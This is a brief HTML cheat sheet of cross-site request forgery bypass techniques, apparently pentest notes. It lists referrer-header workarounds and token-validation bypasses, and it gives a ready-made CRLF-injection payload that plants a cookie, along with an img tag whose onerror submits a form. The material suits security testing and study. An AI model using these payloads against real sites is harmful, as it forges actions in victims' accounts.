<h1>Cross-site request forgery (CSRF)</h1>
<h3>Test first:</h3>
<p><code>Referrer: https://example.com</code></p>
<p>if:</p>
<p>"Invalid referrer header" so:</p>
<p><code>Referrer-Policy: unsafe-url</code></p>
<p>"Invalid referrer validation" so:</p>
<p><code><meta name="referrer" content="no-referrer"></code></p>
<p>else:</p>
<p>csrf without csrf protection - EZ</p>
<p>csrf validation depends on request method  - Change post to get</p>
<p>csrf delete csrf parameter or value.</p>
<p>csrf - drop request and test the token in other session </p>
<p>csrf + crlf - /?search=test%0d%0aSet-Cookie:%20csrfKey=your-key</p>
<p><code><img src="https://domain/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key" onerror="document.forms[0].submit()"></code></p>

